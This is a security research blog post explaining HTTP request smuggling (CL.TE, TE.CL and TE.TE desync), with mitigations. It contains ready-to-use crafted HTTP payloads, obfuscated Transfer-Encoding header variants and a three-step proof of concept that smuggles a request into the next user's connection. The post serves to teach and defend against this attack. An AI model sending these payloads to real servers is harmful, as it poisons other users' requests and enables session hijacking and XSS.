---
title: "HTTP Request Smuggling: CL.TE and TE.CL Attack Techniques"
date: 2021-01-01
description: "Understanding HTTP request smuggling attacks: how CL.TE and TE.CL desync exploits bypass front-end security controls and poison back-end queues"
tags: ["HTTP", "request-smuggling", "web", "CL.TE", "TE.CL", "desync", "web-security"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Overview

HTTP Request Smuggling (also known as HTTP Desync Attack) is a technique that disrupts the processing order of HTTP requests received from one or more users.

![HTTP Request Smuggling overview](/images/blog/http-request-smuggling/Untitled.png)

This attack allows an attacker to bypass security controls, access and exfiltrate sensitive unauthorized data, and directly compromise other application users.

## How It Works

Users send requests to a front-end server, which then forwards one or more requests to the back-end server.

When the front-end server forwards HTTP requests to the back-end server, it typically sends multiple requests over the same back-end network connection — this is more efficient and high-throughput. HTTP requests are sent sequentially, and the receiving server must know where one request ends and the next begins, so it parses HTTP request headers.

![Front-end to back-end forwarding](/images/blog/http-request-smuggling/Untitled 1.png)

In this situation, it is critical that the front-end and back-end systems agree on the boundaries between requests. If not, an attacker can send an ambiguous request that is interpreted differently by each system.

![Request boundary desync](/images/blog/http-request-smuggling/Untitled 2.png)

The attacker causes the back-end server to interpret part of the front-end request as the start of the next request — effectively prepending it to the next request, interfering with how the application processes subsequent requests. This is HTTP Request Smuggling.

The root cause is that web servers are rarely exposed directly to the internet. Load balancers, reverse proxies, and other front-end servers receive and forward requests. During forwarding, when chunked transfer encoding or Content-Length headers are encountered, the server processes a calculated amount of data and leaves the remainder — which then bleeds into the next user's socket. By inserting a crafted value like `GET /test` as the leftover data, the attacker controls the start of the next user's HTTP request.

Because the attacker can control user requests, attacks like XSS and Open Redirect become trivial, and more severe impacts like redirecting sensitive data to an attacker-controlled server are possible. This is fundamentally an HTTP response injection.

## Detection and Analysis

The recommended tool is Burp Suite's `http-request-smuggler` extension.

The detection methodology involves using the `Content-Length` and `Transfer-Encoding` headers to determine which length each server layer trusts.

### CL.TE — Front: Content-Length, Back: Transfer-Encoding

The front-end sees `Content-Length: 13` and forwards the full POST body including `SMUGGLED` to the back-end. The back-end uses chunked encoding and sees `0\r\n`, splitting the request at that boundary. Everything up to `0` is processed as the first request; `SMUGGLED` remains in the back-end connection buffer and gets prepended to the next request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Front: Transfer-Encoding, Back: Content-Length

The reverse case. The front-end uses `Transfer-Encoding` and forwards the full POST body based on the `0\r\n` terminator. The back-end uses `Content-Length: 3` and processes only 3 bytes — the `8` plus CRLF — leaving everything after that queued in the buffer. The next request then begins with `SMUGGLED`.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Because the front-end sends everything based on chunked encoding, but the back-end reads only up to `8` bytes (+CRLF) per `Content-Length`, the next request starts with `SMUGGLED`.

### TE.TE — Both: Transfer-Encoding (obfuscated)

Both servers use `Transfer-Encoding`, but obfuscation causes one of them to ignore the header entirely. This is effectively a countermeasure bypass against CL.TE and TE.CL mitigations.

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

These variations exploit character handling differences so that one of the two server layers stops recognizing the `Transfer-Encoding` header, causing a desync with the other.

To confirm vulnerability, you need to verify that a follow-up request is actually processed starting with `SMUGGLED`. With simple strings like the above, detection must be error-based; otherwise, you send a request to an observable endpoint (triggering a 404, response manipulation, etc.) and race to identify whether arbitrary request processing occurred. Testing must be done quickly to capture the poisoned slot.

**Note:** Testing in production environments is inherently risky. Because the server is left waiting due to chunked encoding, the poisoned buffer triggers on whatever user's request arrives next — not just the tester's. This is similar to cache poisoning in that it affects real users unpredictably.

## Proof of Concept

The following demonstrates the TE.TE bypass variant leading to TE.CL behavior.

**Step 1 — Verify Content-Length and Transfer-Encoding alignment:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 ...
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 12
Transfer-Encoding : chunked

4
test
0
```

When `Content-Length` (12, through `0`) matches the `Transfer-Encoding` boundary — normal processing.

**Step 2 — Introduce length mismatch to detect back-end trust:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 ...
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
0

X
```

`Content-Length` is 13 (through `X`), but `Transfer-Encoding` boundary is at 12 (through `0\r\n`). Result: the back-end hangs waiting for the 13th byte `X`, which is withheld.

This confirms the front-end trusts `Transfer-Encoding` and the back-end trusts `Content-Length`.

**Step 3 — Inject a smuggled request:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 ...
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
e3
GET /otherurl HTTP/1.1
Host: targethost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

With `Content-Length: 13` (up to `e3\r\n`), the front-end sees `Transfer-Encoding` and forwards the entire body. The back-end sees `Content-Length` and processes only up to the `GET /otherurl` boundary, leaving the rest queued.

When the next user's request arrives at the back-end, instead of their intended `POST`, they hit `GET /otherurl` — enabling Redirect, XSS, Session Hijack, and more.

## Mitigation

Current mitigations are limited and operationally expensive:

- **Use HTTP/2 for server-to-server communication** — eliminates the CL/TE ambiguity entirely, but requires significant infrastructure changes
- **Enforce consistent header trust between front-end and back-end** — both servers must agree on which header takes precedence; also requires large-scale coordination
- **Direct validation at the proxy layer** — possible but introduces non-trivial performance overhead

The key takeaways: the attack depends on header trust mismatches between server layers; exploit payloads require precise length calculations; testing on live services must be done carefully to avoid collateral impact.
